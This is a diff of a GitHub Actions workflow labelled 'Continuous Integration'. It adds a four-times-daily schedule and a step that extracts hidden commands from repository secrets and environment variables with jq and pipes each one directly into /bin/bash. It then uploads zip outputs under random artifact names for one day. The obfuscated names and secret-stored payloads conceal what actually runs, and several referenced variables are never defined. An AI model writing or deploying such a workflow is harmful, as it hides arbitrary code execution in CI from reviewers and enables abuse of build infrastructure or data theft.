@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '41 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,17 +17,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          ejk4174: ${{ secrets.ejk4174 }}
+          nyt0: ${{ secrets.nyt0 }}
         run: |
-          printf '%s' "$ejk4174" | jq -r .g6 | /bin/bash
-          printf '%s' "$nfax6" | jq -r .aqvh61 | /bin/bash
-          printf '%s' "$ud0728" | jq -r .qrdkl332 | /bin/bash
-          echo $ac728 | jq -r .vpis394 | /bin/bash
-          echo $zon0065 | jq -r .k48326 | /bin/bash
+          printf '%s' "$nyt0" | jq -r .clig634 | /bin/bash
+          echo $vidzl1521 | jq -r .obef53 | /bin/bash
+          echo $eiwq69495 | jq -r .ccmtz2 | /bin/bash
+          printf '%s' "$cypal3" | jq -r .frtvk4893 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: CtIOMkLR
+          name: 9pzQ4G1L
           path: "*.zip"
           retention-days: 1
